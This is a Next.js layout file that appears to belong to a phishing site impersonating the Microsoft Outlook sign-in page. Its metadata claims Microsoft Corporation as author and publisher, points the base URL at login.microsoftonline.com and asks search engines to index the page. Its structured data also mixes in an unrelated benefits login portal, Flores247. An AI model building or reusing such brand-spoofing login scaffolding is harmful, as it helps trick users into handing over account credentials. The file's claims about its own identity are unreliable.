import type React from "react"
import type { Metadata } from "next"
import { Geist, Geist_Mono } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import "./globals.css"

const _geist = Geist({ subsets: ["latin"] })
const _geistMono = Geist_Mono({ subsets: ["latin"] })


export const metadata: Metadata = {
  metadataBase: new URL(process.env.NEXT_PUBLIC_SITE_URL || 'https://login.microsoftonline.com'),
  title: {
    default: "Microsoft Outlook | Sign in",
    template: "%s | Microsoft Outlook"
  },
  description: "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
  keywords: [
    "Microsoft Outlook login",
    "Outlook Mail sign in",
    "Office 365 login",
    "Microsoft account login",
    "login.microsoftonline.com",
    "Outlook email",
    "OpenID login",
    "offline_access",
    "profile access",
    "Microsoft auth"
  ],
  authors: [{ name: "Microsoft Corporation" }],
  creator: "Microsoft Corporation",
  publisher: "Microsoft Corporation",
  generator: 'Next.js',
  applicationName: "Microsoft Outlook",
  referrer: "origin-when-cross-origin",
  formatDetection: {
    email: false,
    address: false,
    telephone: false,
  },
  icons: {
    icon: [
      { url: '/images.png', sizes: 'any' },
      { url: '/icon-light-32x32.png', sizes: '32x32', type: 'image/png' },
      { url: '/icon-dark-32x32.png', sizes: '32x32', type: 'image/png' },
    ],
    apple: [
      { url: '/apple-icon.png', sizes: '180x180', type: 'image/png' },
    ],
  },
  manifest: '/manifest.json',
  openGraph: {
    type: "website",
    locale: "en_US",
    url: "/",
    siteName: "Microsoft Outlook",
    title: "Microsoft Outlook | Sign in",
    description: "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
    images: [
      {
        url: "/images.png",
        width: 1200,
        height: 630,
        alt: "Microsoft Outlook Login",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title: "Microsoft Outlook | Sign in",
    description: "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
    images: ["/images.png"],
    creator: "@Microsoft",
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  verification: {
    
    
    
    
  },
  alternates: {
    canonical: "/",
  },
  category: "Finance",
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">
      <body className="font-sans antialiased">
        {children}
        <Analytics />
        
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify({
              "@context": "https://schema.org",
              "@type": "Organization",
              "name": "Microsoft Outlook",
              "url": "https://login.microsoftonline.com",
              "logo": "https://login.microsoftonline.com/images.png",
              "description": "Microsoft Outlook provides secure email and productivity services with access to mail, calendar, and contacts.",
              "contactPoint": {
                "@type": "ContactPoint",
                "contactType": "Customer Service",
                "url": "https://www.flores247.com/contact-login.vbhtml"
              },
              "sameAs": [
                "https://www.facebook.com/FloresAssociates",
                "https://www.linkedin.com/company/flores-&-associates"
              ]
            })
          }}
        />
        
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify({
              "@context": "https://schema.org",
              "@type": "WebApplication",
              "name": "Flores247",
              "url": "https://www.flores247.com",
              "applicationCategory": "FinanceApplication",
              "operatingSystem": "Web",
              "offers": {
                "@type": "Offer",
                "price": "0",
                "priceCurrency": "USD"
              },
              "description": "Secure login portal for Flores benefits account management, including FSA, HSA, and HRA plans."
            })
          }}
        />
      </body>
    </html>
  )
}
